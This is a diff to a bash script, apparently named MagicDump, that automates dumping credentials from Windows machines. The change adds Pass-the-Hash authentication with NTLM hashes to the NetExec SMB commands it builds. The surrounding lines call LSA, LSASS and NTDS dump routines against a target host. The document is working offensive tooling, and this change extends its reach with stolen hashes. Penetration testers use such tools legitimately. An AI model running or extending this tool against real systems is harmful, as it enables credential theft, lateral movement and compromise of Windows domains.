@@ -38,12 +38,13 @@ trap "rm -f tmp.$$.json" EXIT
 usage() {
   echo "MagicDump - Automated Windows Credential Dumping Tool"
   echo ""
-  echo "Usage: $0 -t <target_ip> -u <username> -p <password> [--local-auth] [-v|--verbose]"
+  echo "Usage: $0 -t <target_ip> -u <username> [-p <password> | -H <hash>] [--local-auth] [-v|--verbose]"
   echo ""
   echo "Options:"
   echo "  -t, --target     Target IP address of the Windows machine"
   echo "  -u, --username   Username for authentication"
   echo "  -p, --password   Password for authentication"
+  echo "  -H, --hash       NTLM hash for Pass-the-Hash authentication"
   echo "      --local-auth Use local authentication"
   echo "  -v, --verbose    Enable verbose output for debugging"
   echo "  -h, --help       Show this help message and exit"
@@ -55,6 +56,7 @@ usage() {
 TARGET_HOST=""
 USERNAME=""
 PASSWORD=""
+HASH=""
 VERBOSE=0
 LOCAL_AUTH=0  # Default: Do not use local authentication
 
@@ -70,6 +72,10 @@ while [[ $# -gt 0 ]]; do
       ;;
     -p|--password)
       PASSWORD="$2"
+      shift 2
+      ;;
+    -H|--hash)
+      HASH="$2"
       shift 2
       ;;
     --local-auth)
@@ -91,8 +97,13 @@ while [[ $# -gt 0 ]]; do
 done
 
 # Check for required arguments
-if [[ -z "$TARGET_HOST" || -z "$USERNAME" || -z "$PASSWORD" ]]; then
+if [[ -z "$TARGET_HOST" || -z "$USERNAME" || ( -z "$PASSWORD" && -z "$HASH" ) ]]; then
   echo -e "${RED}[ERROR]${RESET} Missing required arguments!"
+  usage
+fi
+
+if [[ -n "$PASSWORD" && -n "$HASH" ]]; then
+  echo -e "${RED}[ERROR]${RESET} Specify either a password (-p) or a hash (-H), but not both!"
   usage
 fi
 
@@ -146,7 +157,12 @@ run_command() {
 
 # Function to construct the base command
 construct_base_cmd() {
-  local base_cmd="nxc smb $TARGET_HOST -u $USERNAME -p '$PASSWORD'"
+  local base_cmd="nxc smb $TARGET_HOST -u $USERNAME"
+  if [[ -n "$PASSWORD" ]]; then
+    base_cmd+=" -p '$PASSWORD'"
+  elif [[ -n "$HASH" ]]; then
+    base_cmd+=" -H '$HASH'"
+  fi
   [[ $LOCAL_AUTH -eq 1 ]] && base_cmd+=" --local-auth"
   echo "$base_cmd"
 }
@@ -251,7 +267,7 @@ dump_lsa
 # Execute LSASS dump
 dump_lsass
 
-# Execute NTDS dump (ntdsutil method)
+# Execute NTDS dump
 dump_ntds
 
 # Display summary to user (without JSON dump)
